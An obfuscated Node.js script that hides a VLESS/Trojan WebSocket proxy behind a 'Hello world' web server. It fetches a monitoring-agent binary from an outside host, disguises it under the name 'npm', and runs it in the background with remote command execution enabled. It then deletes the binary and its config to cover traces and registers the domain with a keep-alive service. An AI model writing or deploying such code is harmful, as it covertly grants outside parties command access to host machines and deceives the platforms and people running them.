const _0xc66c9a=_0x4b39;function _0x417e(){const _0x230ea6=['2202959JfSmHt','data','arch','https://oooo.serv00.net/add-url','false','https://amd64.ssss.nyc.mn/agent','toString','--tls','replace','&type=A','url','application/dns-json','372258SjZrtv','443','Server','\x20with\x20all\x20DNS\x20servers','347900LovAon','npm\x20running\x20error:','once','map','setsid\x20nohup\x20./npm\x20-s\x20','index.html','type','2083','Not\x20Found\x0a','npm\x20download\x20successfully','length','SUB_PATH','readUInt16BE','Status','https://amd64.ssss.nyc.mn/v1','arm64','config.yaml','https://dns.google/resolve?name=','every','writeHead','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','from','257wTqbWt','readUInt8','connect','8.8.4.4','client_secret:\x20','isp',':443?encryption=none&security=tls&sni=','country_code','chmod\x20+x\x20npm','post','application/json','https://arm64.ssss.nyc.mn/v1','join','/bin/bash','http','pipe','PORT','Unknown','32qcTFoU','40nPLsMz','connection','buffer','50c29888-9412-4c13-8f01-adda34164293','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','108dqdvmq','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','error','stream','Automatic\x20Access\x20Task\x20added\x20successfully','7wzjcuI','sub','WSPATH','slice','npm\x20is\x20running','\x20-p\x20','https://','NEZHA_SERVER','split','NAME','child_process','log','digest','test','Hello\x20world!','env','8443','createServer','write','&path=%2F','path','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','utf-8','then','175116jzKfUF','listen','2053',':443?security=tls&sni=','trim','createHash','reduce','utf8','Answer','axios','includes','get','writeFileSync','base64','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','pop','finish','5818110DVYiQE','npm','&fp=chrome&type=ws&host=','concat','catch','AUTO_ACCESS','readFile','vless://','3963042NCKbxf','text/html','2096','createWriteStream','unlink','Hug','arm','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','close','NEZHA_KEY','substr','update','hex','end','text/plain','2087','5948HrKzlG'];_0x417e=function(){return _0x230ea6;};return _0x417e();}(function(_0x506f8e,_0x5e8254){const _0x370c16=_0x4b39,_0x4bd416=_0x506f8e();while(!![]){try{const _0x52d47a=-parseInt(_0x370c16(0xd5))/0x1*(-parseInt(_0x370c16(0xae))/0x2)+-parseInt(_0x370c16(0x85))/0x3*(-parseInt(_0x370c16(0xe7))/0x4)+-parseInt(_0x370c16(0xbf))/0x5+parseInt(_0x370c16(0x9e))/0x6*(parseInt(_0x370c16(0x6d))/0x7)+parseInt(_0x370c16(0xe8))/0x8*(-parseInt(_0x370c16(0xbb))/0x9)+parseInt(_0x370c16(0x96))/0xa+parseInt(_0x370c16(0xaf))/0xb*(-parseInt(_0x370c16(0xed))/0xc);if(_0x52d47a===_0x5e8254)break;else _0x4bd416['push'](_0x4bd416['shift']());}catch(_0x32b0a1){_0x4bd416['push'](_0x4bd416['shift']());}}}(_0x417e,0x60631));const os=require('os'),http=require(_0xc66c9a(0xe3)),fs=require('fs'),axios=require(_0xc66c9a(0x8e)),net=require('net'),path=require(_0xc66c9a(0x81)),crypto=require('crypto'),{Buffer}=require(_0xc66c9a(0xea)),{exec,execSync}=require(_0xc66c9a(0x77)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0xc66c9a(0xeb),NEZHA_SERVER=process[_0xc66c9a(0x7c)][_0xc66c9a(0x74)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0xc66c9a(0x7c)][_0xc66c9a(0xa7)]||'',DOMAIN=process['env']['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process[_0xc66c9a(0x7c)][_0xc66c9a(0x9b)]||![],WSPATH=process['env'][_0xc66c9a(0x6f)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0xc66c9a(0x7c)][_0xc66c9a(0xca)]||_0xc66c9a(0x6e),NAME=process[_0xc66c9a(0x7c)][_0xc66c9a(0x76)]||_0xc66c9a(0xa3),PORT=process[_0xc66c9a(0x7c)][_0xc66c9a(0xe5)]||0x1eb4;function _0x4b39(_0xd347d6,_0x47e233){_0xd347d6=_0xd347d6-0x6c;const _0x417e16=_0x417e();let _0x4b399b=_0x417e16[_0xd347d6];return _0x4b399b;}let ISP='';const GetISP=async()=>{const _0x47db27=_0xc66c9a;try{const _0x169266=await axios[_0x47db27(0x90)]('https://api.ip.sb/geoip'),_0x1426a8=_0x169266[_0x47db27(0xb0)];ISP=(_0x1426a8[_0x47db27(0xdc)]+'-'+_0x1426a8[_0x47db27(0xda)])[_0x47db27(0xb7)](/ /g,'_');}catch(_0x1ac7ab){ISP=_0x47db27(0xe6);}};GetISP();const httpServer=http[_0xc66c9a(0x7e)]((_0x4255b9,_0x5d5b50)=>{const _0x255c58=_0xc66c9a;if(_0x4255b9['url']==='/'){const _0x1394ac=path[_0x255c58(0xe1)](__dirname,_0x255c58(0xc4));fs[_0x255c58(0x9c)](_0x1394ac,_0x255c58(0x8c),(_0x2fd624,_0x11036c)=>{const _0x230d15=_0x255c58;if(_0x2fd624){_0x5d5b50[_0x230d15(0xd2)](0xc8,{'Content-Type':_0x230d15(0x9f)}),_0x5d5b50[_0x230d15(0xab)](_0x230d15(0x7b));return;}_0x5d5b50['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x5d5b50[_0x230d15(0xab)](_0x11036c);});return;}else{if(_0x4255b9[_0x255c58(0xb9)]==='/'+SUB_PATH){const _0x2e0b5e=NAME?NAME+'-'+ISP:ISP,_0x242f77=_0x255c58(0x9d)+UUID+'@'+DOMAIN+_0x255c58(0xdb)+DOMAIN+_0x255c58(0x98)+DOMAIN+_0x255c58(0x80)+WSPATH+'#'+_0x2e0b5e,_0x28b05d='trojan://'+UUID+'@'+DOMAIN+_0x255c58(0x88)+DOMAIN+_0x255c58(0x98)+DOMAIN+_0x255c58(0x80)+WSPATH+'#'+_0x2e0b5e,_0x261574=_0x242f77+'\x0a'+_0x28b05d,_0x2cabbd=Buffer[_0x255c58(0xd4)](_0x261574)[_0x255c58(0xb5)](_0x255c58(0x92));_0x5d5b50['writeHead'](0xc8,{'Content-Type':_0x255c58(0xac)}),_0x5d5b50['end'](_0x2cabbd+'\x0a');}else _0x5d5b50[_0x255c58(0xd2)](0x194,{'Content-Type':_0x255c58(0xac)}),_0x5d5b50[_0x255c58(0xab)](_0x255c58(0xc7));}}),wss=new WebSocket[(_0xc66c9a(0xbd))]({'server':httpServer}),uuid=UUID[_0xc66c9a(0xb7)](/-/g,''),DNS_SERVERS=[_0xc66c9a(0xd8),'1.1.1.1'];function resolveHost(_0x3e1bd5){return new Promise((_0x11d3b6,_0x4d2238)=>{const _0xabb278=_0x4b39;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0xabb278(0x7a)](_0x3e1bd5)){_0x11d3b6(_0x3e1bd5);return;}let _0x424506=0x0;function _0x5110d1(){const _0x4e7b3b=_0xabb278;if(_0x424506>=DNS_SERVERS[_0x4e7b3b(0xc9)]){_0x4d2238(new Error('Failed\x20to\x20resolve\x20'+_0x3e1bd5+_0x4e7b3b(0xbe)));return;}const _0x95d04b=DNS_SERVERS[_0x424506];_0x424506++;const _0x528576=_0x4e7b3b(0xd0)+encodeURIComponent(_0x3e1bd5)+_0x4e7b3b(0xb8);axios[_0x4e7b3b(0x90)](_0x528576,{'timeout':0x1388,'headers':{'Accept':_0x4e7b3b(0xba)}})['then'](_0x147db8=>{const _0x33ab8a=_0x4e7b3b,_0xbba5ae=_0x147db8[_0x33ab8a(0xb0)];if(_0xbba5ae[_0x33ab8a(0xcc)]===0x0&&_0xbba5ae[_0x33ab8a(0x8d)]&&_0xbba5ae['Answer'][_0x33ab8a(0xc9)]>0x0){const _0x34f0c5=_0xbba5ae[_0x33ab8a(0x8d)]['find'](_0x2dea97=>_0x2dea97[_0x33ab8a(0xc5)]===0x1);if(_0x34f0c5){_0x11d3b6(_0x34f0c5[_0x33ab8a(0xb0)]);return;}}_0x5110d1();})['catch'](_0x370410=>{_0x5110d1();});}_0x5110d1();});}function handleVlessConnection(_0x56da6a,_0x1124cd){const _0x81aa80=_0xc66c9a,[_0x51bfd4]=_0x1124cd,_0xd17232=_0x1124cd['slice'](0x1,0x11);if(!_0xd17232[_0x81aa80(0xd1)]((_0xd63eb,_0x5de577)=>_0xd63eb==parseInt(uuid['substr'](_0x5de577*0x2,0x2),0x10)))return![];let _0x135e57=_0x1124cd[_0x81aa80(0x70)](0x11,0x12)[_0x81aa80(0xd6)]()+0x13;const _0x37321e=_0x1124cd['slice'](_0x135e57,_0x135e57+=0x2)[_0x81aa80(0xcb)](0x0),_0x461179=_0x1124cd['slice'](_0x135e57,_0x135e57+=0x1)['readUInt8'](),_0x2c1c5e=_0x461179==0x1?_0x1124cd[_0x81aa80(0x70)](_0x135e57,_0x135e57+=0x4)['join']('.'):_0x461179==0x2?new TextDecoder()['decode'](_0x1124cd[_0x81aa80(0x70)](_0x135e57+0x1,_0x135e57+=0x1+_0x1124cd[_0x81aa80(0x70)](_0x135e57,_0x135e57+0x1)[_0x81aa80(0xd6)]())):_0x461179==0x3?_0x1124cd[_0x81aa80(0x70)](_0x135e57,_0x135e57+=0x10)[_0x81aa80(0x8b)]((_0x32cdb2,_0x4409e0,_0x56a94e,_0x1b4e21)=>_0x56a94e%0x2?_0x32cdb2[_0x81aa80(0x99)](_0x1b4e21[_0x81aa80(0x70)](_0x56a94e-0x1,_0x56a94e+0x1)):_0x32cdb2,[])[_0x81aa80(0xc2)](_0x3509f3=>_0x3509f3['readUInt16BE'](0x0)['toString'](0x10))[_0x81aa80(0xe1)](':'):'';_0x56da6a['send'](new Uint8Array([_0x51bfd4,0x0]));const _0x58a42c=createWebSocketStream(_0x56da6a);return resolveHost(_0x2c1c5e)['then'](_0x4b56f2=>{const _0x5e1160=_0x81aa80;net[_0x5e1160(0xd7)]({'host':_0x4b56f2,'port':_0x37321e},function(){const _0xa42404=_0x5e1160;this[_0xa42404(0x7f)](_0x1124cd[_0xa42404(0x70)](_0x135e57)),_0x58a42c['on']('error',()=>{})[_0xa42404(0xe4)](this)['on'](_0xa42404(0xef),()=>{})[_0xa42404(0xe4)](_0x58a42c);})['on']('error',()=>{});})[_0x81aa80(0x9a)](_0x2f1b6e=>{const _0x31c381=_0x81aa80;net[_0x31c381(0xd7)]({'host':_0x2c1c5e,'port':_0x37321e},function(){const _0x187b10=_0x31c381;this[_0x187b10(0x7f)](_0x1124cd[_0x187b10(0x70)](_0x135e57)),_0x58a42c['on'](_0x187b10(0xef),()=>{})[_0x187b10(0xe4)](this)['on']('error',()=>{})[_0x187b10(0xe4)](_0x58a42c);})['on'](_0x31c381(0xef),()=>{});}),!![];}function handleTrojanConnection(_0x5e30bc,_0x26da9f){const _0x282787=_0xc66c9a;try{if(_0x26da9f[_0x282787(0xc9)]<0x3a)return![];const _0x49cc51=_0x26da9f['slice'](0x0,0x38)[_0x282787(0xb5)](),_0xd547ed=[UUID];let _0x185d9f=null;for(const _0x50d45e of _0xd547ed){const _0xb808f4=crypto[_0x282787(0x8a)]('sha224')[_0x282787(0xa9)](_0x50d45e)[_0x282787(0x79)](_0x282787(0xaa));if(_0xb808f4===_0x49cc51){_0x185d9f=_0x50d45e;break;}}if(!_0x185d9f)return![];let _0x1c0b24=0x38;_0x26da9f[_0x1c0b24]===0xd&&_0x26da9f[_0x1c0b24+0x1]===0xa&&(_0x1c0b24+=0x2);const _0x5b2e75=_0x26da9f[_0x1c0b24];if(_0x5b2e75!==0x1)return![];_0x1c0b24+=0x1;const _0x40806a=_0x26da9f[_0x1c0b24];_0x1c0b24+=0x1;let _0x111987,_0x634ed;if(_0x40806a===0x1)_0x111987=_0x26da9f[_0x282787(0x70)](_0x1c0b24,_0x1c0b24+0x4)[_0x282787(0xe1)]('.'),_0x1c0b24+=0x4;else{if(_0x40806a===0x3){const _0x50bb15=_0x26da9f[_0x1c0b24];_0x1c0b24+=0x1,_0x111987=_0x26da9f[_0x282787(0x70)](_0x1c0b24,_0x1c0b24+_0x50bb15)[_0x282787(0xb5)](),_0x1c0b24+=_0x50bb15;}else{if(_0x40806a===0x4)_0x111987=_0x26da9f['slice'](_0x1c0b24,_0x1c0b24+0x10)[_0x282787(0x8b)]((_0x2a2884,_0x3e867c,_0x1fb720,_0x3ca3fe)=>_0x1fb720%0x2?_0x2a2884[_0x282787(0x99)](_0x3ca3fe['slice'](_0x1fb720-0x1,_0x1fb720+0x1)):_0x2a2884,[])[_0x282787(0xc2)](_0x1c7f7e=>_0x1c7f7e[_0x282787(0xcb)](0x0)['toString'](0x10))['join'](':'),_0x1c0b24+=0x10;else return![];}}_0x634ed=_0x26da9f['readUInt16BE'](_0x1c0b24),_0x1c0b24+=0x2;_0x1c0b24<_0x26da9f[_0x282787(0xc9)]&&_0x26da9f[_0x1c0b24]===0xd&&_0x26da9f[_0x1c0b24+0x1]===0xa&&(_0x1c0b24+=0x2);const _0x445c35=createWebSocketStream(_0x5e30bc);return resolveHost(_0x111987)[_0x282787(0x84)](_0x5e189d=>{const _0x3c8603=_0x282787;net[_0x3c8603(0xd7)]({'host':_0x5e189d,'port':_0x634ed},function(){const _0x31a2e0=_0x3c8603;_0x1c0b24<_0x26da9f[_0x31a2e0(0xc9)]&&this[_0x31a2e0(0x7f)](_0x26da9f[_0x31a2e0(0x70)](_0x1c0b24)),_0x445c35['on'](_0x31a2e0(0xef),()=>{})['pipe'](this)['on'](_0x31a2e0(0xef),()=>{})['pipe'](_0x445c35);})['on'](_0x3c8603(0xef),()=>{});})[_0x282787(0x9a)](_0x52d213=>{const _0x4728f3=_0x282787;net[_0x4728f3(0xd7)]({'host':_0x111987,'port':_0x634ed},function(){const _0x59f402=_0x4728f3;_0x1c0b24<_0x26da9f[_0x59f402(0xc9)]&&this['write'](_0x26da9f[_0x59f402(0x70)](_0x1c0b24)),_0x445c35['on'](_0x59f402(0xef),()=>{})[_0x59f402(0xe4)](this)['on'](_0x59f402(0xef),()=>{})[_0x59f402(0xe4)](_0x445c35);})['on']('error',()=>{});}),!![];}catch(_0x31b96b){return![];}}wss['on'](_0xc66c9a(0xe9),(_0x15578a,_0x89446a)=>{const _0x7c6eb7=_0xc66c9a,_0x36fa67=_0x89446a['url']||'';_0x15578a[_0x7c6eb7(0xc1)]('message',_0x2875f7=>{const _0x90bb23=_0x7c6eb7;if(_0x2875f7['length']>0x11&&_0x2875f7[0x0]===0x0){const _0x11b314=_0x2875f7['slice'](0x1,0x11),_0x5b9e44=_0x11b314[_0x90bb23(0xd1)]((_0x41443a,_0x218d63)=>_0x41443a==parseInt(uuid[_0x90bb23(0xa8)](_0x218d63*0x2,0x2),0x10));if(_0x5b9e44){!handleVlessConnection(_0x15578a,_0x2875f7)&&_0x15578a[_0x90bb23(0xa6)]();return;}}!handleTrojanConnection(_0x15578a,_0x2875f7)&&_0x15578a[_0x90bb23(0xa6)]();})['on'](_0x7c6eb7(0xef),()=>{});});const getDownloadUrl=()=>{const _0x40ac32=_0xc66c9a,_0x4301e0=os[_0x40ac32(0xb1)]();return _0x4301e0===_0x40ac32(0xa4)||_0x4301e0===_0x40ac32(0xce)||_0x4301e0==='aarch64'?!NEZHA_PORT?_0x40ac32(0xe0):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x40ac32(0xcd):_0x40ac32(0xb4);},downloadFile=async()=>{const _0x47b0d7=_0xc66c9a;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1b5e84=getDownloadUrl(),_0x44e03f=await axios({'method':_0x47b0d7(0x90),'url':_0x1b5e84,'responseType':_0x47b0d7(0xf0)}),_0x54f2db=fs[_0x47b0d7(0xa1)](_0x47b0d7(0x97));return _0x44e03f[_0x47b0d7(0xb0)][_0x47b0d7(0xe4)](_0x54f2db),new Promise((_0x37a1fa,_0x1c111c)=>{const _0x40b6c7=_0x47b0d7;_0x54f2db['on'](_0x40b6c7(0x95),()=>{const _0x3281fc=_0x40b6c7;console[_0x3281fc(0x78)](_0x3281fc(0xc8)),exec(_0x3281fc(0xdd),_0x29e585=>{if(_0x29e585)_0x1c111c(_0x29e585);_0x37a1fa();});}),_0x54f2db['on'](_0x40b6c7(0xef),_0x1c111c);});}catch(_0x157ff5){throw _0x157ff5;}},runnz=async()=>{const _0xafe26e=_0xc66c9a;try{const _0x4ee525=execSync(_0xafe26e(0x93),{'encoding':_0xafe26e(0x83)});if(_0x4ee525[_0xafe26e(0x89)]()!==''){console[_0xafe26e(0x78)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x4edd4e){}await downloadFile();let _0x38f7d0='',_0x57db25=[_0xafe26e(0xbc),_0xafe26e(0x7d),_0xafe26e(0xa0),_0xafe26e(0xad),_0xafe26e(0xc6),_0xafe26e(0x87)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5536f4=_0x57db25[_0xafe26e(0x8f)](NEZHA_PORT)?_0xafe26e(0xb6):'';_0x38f7d0=_0xafe26e(0xc3)+NEZHA_SERVER+':'+NEZHA_PORT+_0xafe26e(0x72)+NEZHA_KEY+'\x20'+_0x5536f4+_0xafe26e(0xa5);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5792e0=NEZHA_SERVER[_0xafe26e(0x8f)](':')?NEZHA_SERVER[_0xafe26e(0x75)](':')[_0xafe26e(0x94)]():'',_0x544426=_0x57db25[_0xafe26e(0x8f)](_0x5792e0)?'true':_0xafe26e(0xb3),_0x451a4a=_0xafe26e(0xd9)+NEZHA_KEY+_0xafe26e(0xee)+NEZHA_SERVER+_0xafe26e(0x82)+_0x544426+_0xafe26e(0xd3)+UUID;fs[_0xafe26e(0x91)](_0xafe26e(0xcf),_0x451a4a);}_0x38f7d0=_0xafe26e(0xec);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x38f7d0,{'shell':_0xafe26e(0xe2)},_0x351035=>{const _0x542070=_0xafe26e;if(_0x351035)console[_0x542070(0xef)](_0x542070(0xc0),_0x351035);else console[_0x542070(0x78)](_0x542070(0x71));});}catch(_0x335cec){console['error']('error:\x20'+_0x335cec);}};async function addAccessTask(){const _0x529df3=_0xc66c9a;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4d2034=_0x529df3(0x73)+DOMAIN;try{const _0x130126=await axios[_0x529df3(0xde)](_0x529df3(0xb2),{'url':_0x4d2034},{'headers':{'Content-Type':_0x529df3(0xdf)}});console[_0x529df3(0x78)](_0x529df3(0x6c));}catch(_0x533746){}}const delFiles=()=>{const _0x583d51=_0xc66c9a;fs[_0x583d51(0xa2)]('npm',()=>{}),fs[_0x583d51(0xa2)](_0x583d51(0xcf),()=>{});};httpServer[_0xc66c9a(0x86)](PORT,()=>{const _0x290a2d=_0xc66c9a;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x290a2d(0x78)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
